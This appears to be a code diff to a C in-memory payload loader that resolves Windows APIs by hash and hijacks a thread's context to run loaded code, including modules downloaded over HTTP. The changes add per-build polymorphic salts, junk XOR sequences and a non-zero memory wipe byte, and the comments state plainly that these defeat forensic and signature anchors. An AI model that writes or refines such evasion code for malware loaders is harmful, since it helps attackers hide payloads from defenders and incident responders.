@@ -31,6 +31,16 @@
 
 #include "loader.h"
 
+/* Fallback defaults if poly_seed.h was not generated (clean build before
+   gen_poly ran). Live values come via the hash.h / encrypt.h
+   __has_include chain that pulls in poly_seed.h. */
+#ifndef LOADER_WIPE_BYTE
+#define LOADER_WIPE_BYTE 0x00u
+#endif
+#ifndef LOADER_POLY_SALT
+#define LOADER_POLY_SALT 0u
+#endif
+
 DWORD MainProc(PFRITTER_INSTANCE inst);
 
 HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
@@ -38,6 +48,7 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
     GetThreadContext_t _GetThreadContext;
     GetCurrentThread_t _GetCurrentThread;
     NtContinue_t       _NtContinue;
+    GetModuleHandleA_t _GetModuleHandleA;
     ULONG64            hash;
     HANDLE             h = NULL;
     CONTEXT            c;
@@ -75,11 +86,25 @@ HANDLE FritterLoader(PFRITTER_INSTANCE inst) {
       _GetCurrentThread = (GetCurrentThread_t)xGetProcAddressByHash(inst, hash, inst->iv);
 
       // get the base address of the host process's executable
-      host = inst->api.GetModuleHandle(NULL);
+      DPRINT("Resolving address of GetModuleHandleA");
+      hash = inst->api.hash[ (offsetof(FRITTER_INSTANCE, api.GetModuleHandleA) - offsetof(FRITTER_INSTANCE, api)) / sizeof(ULONG_PTR)];
+      _GetModuleHandleA = (GetModuleHandleA_t)xGetProcAddressByHash(inst, hash, inst->iv);
+      if(_GetModuleHandleA == NULL) {
+        DPRINT("FAILED to resolve GetModuleHandleA");
+        return (HANDLE)-1;
+      }
+      host = _GetModuleHandleA(NULL);
       
       if(_NtContinue != NULL && _GetThreadContext != NULL && _GetCurrentThread != NULL) {
         c.ContextFlags = CONTEXT_FULL;
         _GetThreadContext(_GetCurrentThread(), &c);
+        /* P3 Site B was attempted here (volatile salt-cancel into a
+           mirror of inst->oep, gated on LOADER_POLY_SALT bit 4) but
+           empirically failed: under some FritterLoader register-allocation
+           conditions, mingw-w64 GCC -O1 placed the volatile auto in a
+           register and folded the XOR pair into a single un-cancelled
+           XOR, corrupting c.Rip and hanging the NtContinue thread.
+           Removed; sites A and C cover the default execution path. */
         #ifdef _WIN64
           c.Rip = RVA2VA(DWORD64, host, inst->oep);
           c.Rsp &= -16;
@@ -199,9 +224,18 @@ DWORD MainProc(PFRITTER_INSTANCE inst) {
       xGetLibAddress(inst, path);
     }
     
-    DPRINT("Resolving %i API", inst->api_cnt);
-    
-    for(i=1; i<inst->api_cnt; i++) {
+    /* P3 Site C - salt-cancel into a volatile mirror of inst->api_cnt,
+       gated on LOADER_POLY_SALT bit 8. Mirror is read once into a
+       non-volatile loop bound (no per-iter penalty). */
+    volatile uint32_t _api_cnt_v = inst->api_cnt;
+    #if (LOADER_POLY_SALT & 0x00000100u)
+    { uint32_t _s = ((uint32_t)LOADER_POLY_SALT << 13) ^ 0xCAFEBABEu;
+      _api_cnt_v ^= _s; _api_cnt_v ^= _s; }
+    #endif
+    uint32_t api_cnt_local = _api_cnt_v;
+    DPRINT("Resolving %i API", api_cnt_local);
+
+    for(i=1; i<api_cnt_local; i++) {
       DPRINT("Resolving API address for %016llX", inst->api.hash[i]);
         
       inst->api.addr[i] = xGetProcAddressByHash(inst, inst->api.hash[i], inst->iv);
@@ -288,8 +322,9 @@ erase_memory:
     // if module was downloaded
     if(inst->type == FRITTER_INSTANCE_HTTP) {
       if(inst->module.p != NULL) {
-        // overwrite memory with zeros
-        Memset(inst->module.p, 0, (DWORD)inst->mod_len);
+        // overwrite memory with the per-build wipe byte (parity with the
+        // inst wipe below; defeats post-execution zero-pattern anchors)
+        Memset(inst->module.p, LOADER_WIPE_BYTE, (DWORD)inst->mod_len);
         
         // free memory
         _VirtualFree(inst->module.p, 0, MEM_RELEASE | MEM_DECOMMIT);
@@ -301,7 +336,19 @@ erase_memory:
     term = (BOOL) (inst->exit_opt == FRITTER_OPT_EXIT_PROCESS);
     
     DPRINT("Erasing RW memory for instance");
-    Memset(inst, 0, inst->len);
+    /* Per-build wipe byte (LOADER_WIPE_BYTE from gen_poly) - defeats the
+       "find a zeroed page near the decoded shim" forensic anchor. The
+       data is destroyed regardless of byte value.
+       P3 Site A - salt-cancel into a volatile mirror of inst->len,
+       gated on LOADER_POLY_SALT bit 0. */
+    {
+      volatile uint32_t _wipe_sz = inst->len;
+      #if (LOADER_POLY_SALT & 0x00000001u)
+      { uint32_t _s = LOADER_POLY_SALT ^ 0xA5A50000u;
+        _wipe_sz ^= _s; _wipe_sz ^= _s; }
+      #endif
+      Memset(inst, LOADER_WIPE_BYTE, _wipe_sz);
+    }
     
     DPRINT("Releasing RW memory for instance");
     _VirtualFree(inst, 0, MEM_DECOMMIT | MEM_RELEASE);
